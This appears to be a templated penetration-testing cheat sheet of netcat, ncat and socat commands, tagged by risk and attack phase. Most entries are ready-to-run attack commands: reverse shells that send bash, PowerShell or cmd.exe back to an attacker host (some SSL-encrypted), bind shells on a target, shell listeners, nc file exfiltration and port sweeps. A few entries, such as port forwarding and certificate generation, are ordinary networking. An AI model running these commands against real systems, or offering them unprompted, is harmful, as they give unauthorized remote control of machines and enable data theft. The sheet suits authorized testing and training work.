# Netcat / Ncat / Socat

> Network utility tools for connections, listeners, port forwarding, and shell relays

<!-- tags: netcat, ncat, socat, listener, shell, network -->

---

## nc - Listener (Catch Reverse Shell)
Start a netcat listener to catch incoming reverse shell connections.

```bash
nc -lvnp {{LPORT:port:4444}}
```

<!-- meta: risk=low | phase=exploit | tags=listener,nc,reverse-shell -->

---

## nc - Connect to a Port
Connect to an open port on a remote host.

```bash
nc -nv {{TARGET:ip}} {{PORT:port:80}}
```

<!-- meta: risk=safe | phase=enum | tags=connect,nc -->

---

## nc - Bind Shell Connect
Connect to a bind shell already running on a target.

```bash
nc -nv {{TARGET:ip}} {{PORT:port:4444}}
```

<!-- meta: risk=med | phase=exploit | tags=bind-shell,connect -->

---

## ncat - SSL Encrypted Listener
Start an encrypted listener using Ncat with SSL.

```bash
ncat --ssl -lvnp {{LPORT:port:4444}}
```

<!-- meta: risk=low | phase=exploit | tags=ncat,ssl,encrypted -->

---

## socat - Bind Shell (Listener on Target)
Create a bind shell on the target that waits for connections.

```bash
socat TCP-LISTEN:{{LPORT:port:4444}},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

<!-- meta: risk=high | phase=exploit | tags=socat,bind-shell -->

---

## socat - Reverse Shell (From Target to Attacker)
Send a reverse shell from the target back to the attacker.

```bash
socat TCP:{{LHOST:ip}}:{{LPORT:port:4444}} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

<!-- meta: risk=high | phase=exploit | tags=socat,reverse-shell -->

---

## socat - Catch Reverse Shell (Attacker Listener)
Listen for an incoming socat reverse shell with a full TTY.

```bash
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT:port:4444}}
```

<!-- meta: risk=low | phase=exploit | tags=socat,listener,tty -->

---

## socat - Port Forward
Forward traffic from a local port to a remote host and port.

```bash
socat TCP-LISTEN:{{LPORT:port:8080}},fork TCP:{{TARGET:ip}}:{{RPORT:port:80}}
```

<!-- meta: risk=low | phase=post | tags=socat,portforward -->

---

## socat - Encrypted Shell with SSL
Create an encrypted reverse shell using OpenSSL certificates.

```bash
socat OPENSSL-LISTEN:{{LPORT:port:4443}},cert={{CERT:file:shell.pem}},verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

<!-- meta: risk=high | phase=exploit | tags=socat,ssl,encrypted -->

---

## nc - BSD Listener (No -p Flag)
Minimal BSD netcat listener for environments that lack GNU-style flags.

```bash
nc -l {{LPORT:port:4444}}
```

<!-- meta: risk=low | phase=exploit | tags=nc,bsd,listener -->

---

## nc - Send File
Pipe a file to a waiting listener on the remote host.

```bash
nc {{TARGET:ip}} {{PORT:port:4444}} < {{FILE:file}}
```

<!-- meta: risk=low | phase=post | tags=nc,file,transfer,send -->

---

## nc - Receive File
Listen for an incoming file stream and write it to disk.

```bash
nc -lvnp {{LPORT:port:4444}} > {{OUTFILE:file:recv.bin}}
```

<!-- meta: risk=low | phase=post | tags=nc,file,transfer,receive -->

---

## nc - Port Scan (No Nmap)
Sweep a port range with netcat when nmap is unavailable.

```bash
nc -zv {{TARGET:ip}} {{PORTS:str:1-1000}}
```

<!-- meta: risk=safe | phase=enum | tags=nc,scan,ports -->

---

## socat - Windows Reverse Shell via PowerShell
Spawn a Windows reverse shell calling powershell.exe with pipes.

```bash
socat TCP:{{LHOST:ip}}:{{LPORT:port:4444}} EXEC:powershell.exe,pipes
```

<!-- meta: risk=high | phase=exploit | tags=socat,windows,powershell -->

---

## socat - Encrypted Cert Generation
Generate a self-signed certificate for encrypted socat shells.

```bash
openssl req -newkey rsa:2048 -nodes -keyout {{KEY:file:shell.key}} -x509 -days 362 -out {{CERT:file:shell.crt}} && cat {{KEY:file:shell.key}} {{CERT:file:shell.crt}} > {{PEM:file:shell.pem}}
```

<!-- meta: risk=safe | phase=misc | tags=socat,openssl,cert -->

---

## socat - OPENSSL Connect to Encrypted Listener
Connect from the target back to an encrypted socat listener.

```bash
socat OPENSSL:{{LHOST:ip}}:{{LPORT:port:4443}},verify=0 EXEC:/bin/bash
```

<!-- meta: risk=high | phase=exploit | tags=socat,openssl,connect -->

---

## socat - Encrypted Windows Bind Shell
Listen on the target with SSL and exec cmd.exe for incoming attackers.

```bash
socat OPENSSL-LISTEN:{{LPORT:port:4443}},cert={{PEM:file:shell.pem}},verify=0 EXEC:cmd.exe,pipes
```

<!-- meta: risk=high | phase=exploit | tags=socat,windows,ssl,bind -->
